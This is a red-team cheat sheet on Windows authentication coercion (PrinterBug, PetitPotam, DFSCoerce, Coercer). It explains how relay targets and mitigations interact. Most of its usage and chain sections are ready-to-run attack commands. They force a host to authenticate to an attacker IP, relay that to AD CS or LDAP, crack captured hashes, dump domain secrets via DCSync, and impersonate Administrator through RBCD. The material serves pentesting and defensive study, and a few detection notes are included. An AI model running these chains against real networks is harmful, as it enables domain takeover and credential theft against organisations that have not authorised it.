# 📌 Authentication Coercion (PrinterBug, PetitPotam, DFSCoerce)

> Force a Windows machine to authenticate to you — then relay or crack that auth. With any low-priv domain account, this can chain into full domain compromise in minutes.

---

## 🔍 Definition

Authentication coercion is a class of techniques that forces a Windows host (including Domain Controllers) to initiate an **outbound NTLM or Kerberos authentication** to an attacker-controlled server. The attacker then either **captures** the NTLMv2 hash (for cracking) or **relays** it to another service (for lateral movement or privilege escalation — typically via NTLM relay to AD CS ESC8, LDAP for RBCD, or other services with signing disabled).

Core insight: **Any authenticated domain user** can trigger most of these techniques against any host in the domain. No admin required.

---

## 🧠 Core Concepts

- **NTLM Relay** — relay the coerced auth to a target service. The relay server (ntlmrelayx) relays the auth mid-handshake. The victim authenticates to the attacker, the attacker authenticates to the real target
- **SMB Signing** — when enabled, NTLM relay to SMB fails (signatures can't be forged). When disabled, SMB is a valid relay target. **DCs always require SMB signing; workstations often don't**
- **LDAP Signing + Channel Binding** — prevents NTLM relay to LDAP. Default on DCs in Windows Server 2022 23H2+. Legacy systems often still vulnerable
- **EPA (Extended Protection for Authentication)** — prevents NTLM relay to HTTPS/AD CS. Enabled by default on fresh Server 2022/2025 installs
- **WebClient service** — when running, coercion via HTTP (not SMB) is possible, enabling relay to LDAPS/HTTPS targets even when channel binding is enforced on LDAP (because HTTP ≠ TLS)
- **Machine account hash** — coercion forces the **machine account** (`COMPUTER$`) to authenticate, not a user. The relayed or captured credential is the machine account's NTLMv2 hash
- **Coercer tool** — automated Python tool that tries all known coercion techniques against a target in one shot

---

## ⚙️ Coercion Techniques Comparison

| Technique | Protocol | Auth Needed | Patchable | SMB + HTTP |
|-----------|----------|------------|-----------|------------|
| PrinterBug | MS-RPRN | Yes (any domain user) | No (by design) | SMB only |
| PetitPotam | MS-EFSR | No (unauthenticated variant) | Partial (CVE-2021-36942) | SMB + HTTP |
| DFSCoerce | MS-DFSNM | Yes (any domain user) | No patch | SMB + HTTP |
| ShadowCoerce | MS-FSRVP | Yes (any domain user) | No patch | SMB only |
| MSEven | MS-EVEN | Yes (any domain user) | No patch | SMB only |
| Coercer | All of the above | Varies | Varies | Both |

> 💡 **Windows Server 2022 23H2 / Windows 11 24H2 hardening**: LDAP channel binding on by default. NTLM relay to LDAP is now blocked on updated DCs. Relay to HTTP (AD CS) still works if EPA is not enforced. Relay to SMB without signing still works on workstations.

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| PrinterBug | MS-RPRN abuse. Forces Print Spooler service to auth to attacker. By design, not patched |
| PetitPotam | MS-EFSRPC abuse. CVE-2021-36942 (unauth variant partially patched). Still works authenticated |
| DFSCoerce | MS-DFSNM abuse. Reliable, unpatched alternative to PetitPotam |
| Coercer | Python tool automating all coercion techniques at once |
| ntlmrelayx | Impacket tool — receives coerced NTLM auth and relays it to target services |
| ESC8 chain | Coerce DC → relay to AD CS HTTP → get DC cert → DCSync |
| RBCD chain | Coerce host → relay to LDAP → set RBCD → S4U → local admin/SYSTEM |
| Shadow Credentials | Relay to LDAP → set `msDS-KeyCredentialLink` → PKINIT auth as victim |
| CVE-2025-33073 | NTLM reflection vuln (Jan 2026) — coerce + relay back to the same machine |

---

## 🔥 Important Details & Gotchas

- **PrinterBug is "by design"** — Microsoft has explicitly refused to patch it. Only mitigation is disabling the Print Spooler service on DCs and member servers
- **PetitPotam unauthenticated variant** — CVE-2021-36942 partially patched the two unauthenticated functions. But **authenticated coercion via PetitPotam still works** on patched systems with any domain user
- **DFSCoerce is the most reliable fallback** — unpatched, works on all Windows versions, requires any domain user
- **LDAP channel binding default (2022 23H2+)** — relay to LDAP is now blocked on updated DCs. Relay to HTTP (AD CS) still works if EPA not enabled. Relay to SMB workstations (no signing) still works
- **The WebClient trick** — if WebClient service is running, coerce the target via HTTP instead of SMB. HTTP auth can then be relayed to LDAPS (bypassing channel binding since it's not the same TLS context). Combine with ADIDNS poisoning for a hostname
- **CVE-2025-33073 (Jan 2026)** — NTLM reflection. Coerce local SYSTEM processes → relay back to same machine → local admin. Patched in January 2026 but wildly deployed during the window
- **MSEven coercion** — relatively new (2025, Unit 42 observed in wild). Abuses MS-EVEN (event log remote access) for coercion. Rare protocol = evades filters targeting known coercion tools
- **Detection: protocol rarity** — effective blue team approach is baselining normal RPC protocols and alerting on rare ones used for coercion (MS-DFSNM, MS-EFSR)

---

## 🌍 Real-World Usage / Examples

**Check coercion vulnerability:**
```bash
# SMB signing status (coercion viable only if signing disabled for relay)
nxc smb <subnet>/24 --gen-relay-list relay_targets.txt
nxc smb <target> -u user -p pass -M coerce_plus   # check all coercion vulns
```

**PrinterBug:**
```bash
# printerbug.py (old but reliable)
python3 printerbug.py corp.local/user:pass@<TARGET-FQDN> <ATTACKER-IP>

# dementor.py
python3 dementor.py -d corp.local -u user -p pass <ATTACKER-IP> <TARGET-FQDN>
```

**PetitPotam:**
```bash
# Unauthenticated (partially patched)
python3 PetitPotam.py <ATTACKER-IP> <TARGET-IP>

# Authenticated (still works post-patch)
python3 PetitPotam.py -u user -p pass -d corp.local <ATTACKER-IP> <TARGET-IP>
```

**DFSCoerce:**
```bash
python3 dfscoerce.py -u user -p pass -d corp.local <ATTACKER-IP> <TARGET-IP>
```

**Coercer (all techniques in one):**
```bash
# Try all coercion methods against target
coercer coerce -u user -p pass -d corp.local \
  --listener-ip <ATTACKER-IP> --target-ip <TARGET-IP>

# Scan for what's exploitable
coercer scan -u user -p pass -d corp.local --target-ip <TARGET-IP>
```

---

### Chain 1: Coerce → Capture hash → Crack (Responder)

```bash
# Terminal 1: Responder (capture NTLMv2 hash)
sudo responder -I eth0 -rdwv

# Terminal 2: Coerce
python3 PetitPotam.py -u user -p pass -d corp.local <LHOST-IP> <DC-IP>
# Responder captures COMPUTER$@DOMAIN NTLMv2 hash

# Crack
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
```

---

### Chain 2: Coerce → Relay to AD CS (ESC8) → DCSync

```bash
# Terminal 1: Start relay to AD CS HTTP endpoint
impacket-ntlmrelayx -t http://<CA-IP>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Terminal 2: Coerce the DC
python3 PetitPotam.py -u user -p pass -d corp.local <LHOST-IP> <DC-IP>

# ntlmrelayx output: base64 certificate for DC machine account

# Use cert to get TGT + NT hash
certipy auth -pfx DC01.pfx -dc-ip <DC-IP>

# DCSync
impacket-secretsdump -k -no-pass corp.local/DC01$@<DC-FQDN>
```

---

### Chain 3: Coerce → Relay to LDAP → RBCD → Local SYSTEM

```bash
# Terminal 1: Start relay targeting LDAP (set RBCD)
impacket-ntlmrelayx -t ldap://<DC-IP> -smb2support --delegate-access \
  --escalate-user attacker_machine$

# Terminal 2: Coerce TARGET machine
python3 dfscoerce.py -u user -p pass -d corp.local <LHOST-IP> <TARGET-FQDN>

# ntlmrelayx sets RBCD on TARGET$ for attacker_machine$
# Then do standard RBCD S4U attack:
impacket-getST -spn cifs/target.corp.local -impersonate Administrator \
  -dc-ip <DC-IP> corp.local/attacker_machine$:pass

export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass corp.local/Administrator@target.corp.local
```

---

### Chain 4: Coerce → Shadow Credentials (Relay to LDAP)

```bash
# Terminal 1: Relay to LDAP, abuse Shadow Credentials
certipy relay -target ldap://<DC-IP> -template DomainController

# Terminal 2: Coerce
python3 dfscoerce.py -u user -p pass -d corp.local <LHOST-IP> <DC-FQDN>

# Certipy sets msDS-KeyCredentialLink on DC → PKINIT auth → dump DC secrets
```

---

## 🔗 Related Topics

- [[Active Directory (AD)]]
- [[NTLM and Pass-the-Hash]]
- [[AD Certificate Services (AD CS)]]
- [[Delegation Attacks (Constrained, Unconstrained)]]
- [[BloodHound & Attack Path Analysis]]
- [[SMB Enumeration]]
- [[LDAP Enumeration]]
- [[Shadow Credentials]]

---

## 📚 Sources / Further Reading

- [RedTeam Pentesting — Ultimate Guide to Windows Coercion (2025)](https://blog.redteam-pentesting.de/2025/windows-coercion/) — definitive 2025 reference covering all techniques + hardening
- [Unit 42 — Authentication Coercion Evolving (Nov 2025)](https://unit42.paloaltonetworks.com/authentication-coercion/) — MSEven real-world attack coverage
- [Horizon3 — NTLM Coercion Impact](https://horizon3.ai/attack-research/n0-attack-paths/the-elephant-in-the-room-ntlm-coercion-and-understanding-its-impact/) — attack chain breakdown for blue teams
- [TrueSec — PetitPotam to DA](https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory) — full ESC8 chain walkthrough
- [RBT Security — CVE-2025-33073 NTLM Reflection](https://www.rbtsec.com/blog/ntlm-reflection-abusing-ntlm-for-privilege-escalation-cve-2025-33073/) — Jan 2026 vuln walkthrough
- Coercer: `https://github.com/p0dalirius/Coercer`
- PetitPotam: `https://github.com/topotam/PetitPotam`
- DFSCoerce: `https://github.com/nickvourd/DFSCoerce`
